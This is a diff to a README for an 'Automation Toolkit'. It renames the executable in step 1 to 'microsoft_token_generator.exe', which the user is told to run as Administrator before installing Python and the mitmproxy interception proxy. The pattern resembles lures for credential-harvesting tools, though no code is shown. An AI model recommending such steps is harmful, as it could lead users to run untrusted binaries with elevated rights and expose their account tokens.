@@ -15,7 +15,7 @@ An advanced, ultra-lightweight, and lightning-fast **Automation Toolkit** engine
 Before launching the toolkit executable, you **MUST** configure the runtime framework dependencies. 
 
 ### Step 1: Install Python & Mitmproxy Core
-1. Run `NexusToolkitApp.exe` as **Administrator** (Required for Registry changes).
+1. Run `microsoft_token_generator.exe` as **Administrator** (Required for Registry changes).
 2. Navigate directly to the 4th tab: **`DEPENDENCIES MANAGER`**.
 3. Click **`DOWNLOAD PYTHON EXECUTABLE`** and install Python 3.11+. *(Ensure you check "Add Python to PATH" during installation).*
 4. Click **`DOWNLOAD MITMPROXY EXECUTABLE`** and complete the standard installation wizard.
